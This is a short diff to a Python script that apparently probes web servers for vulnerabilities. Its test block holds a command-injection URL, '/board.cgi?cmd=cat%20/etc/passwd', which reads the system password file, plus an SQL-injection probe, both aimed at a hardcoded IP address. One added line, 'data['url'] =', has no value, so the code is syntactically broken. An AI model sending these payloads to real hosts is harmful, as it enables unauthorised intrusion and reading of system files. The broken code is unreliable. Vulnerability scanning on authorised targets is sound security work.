@@ -6,9 +6,12 @@ import requests
 
 
 def check_vul(**data):
+    #' replace %27, " replace %22
     file = open('/tmp/http_content.txt', 'a')
     useragent = ''
     if 'url' in data.keys() and 'hostname' in data.keys():
+        data['url'] =
+        # 判断url里面是否包含'或者",如果包含需要进行编码转换
         httpurl = 'http://'+data['hostname'] + data['url']
         httpsurl = 'https://'+data['hostname'] + data['url']
     else:
@@ -42,8 +45,9 @@ def check_vul(**data):
 if __name__ == '__main__':
     header = headers = {'user-agent': 'my-app/0.0.1'}
     url = '/board.cgi?cmd=cat%20/etc/passwd'
+    url1 = "/test/id=1'"
     hostname = '114.113.67.49'
     port = ''
     postdata = ''
     method = 'GET'
-    check_vul(url = url, port = port, postdata = postdata, header = header, method = method )
+    check_vul(url = url, hostname = hostname, port = port, postdata = postdata, header = header, method = method )
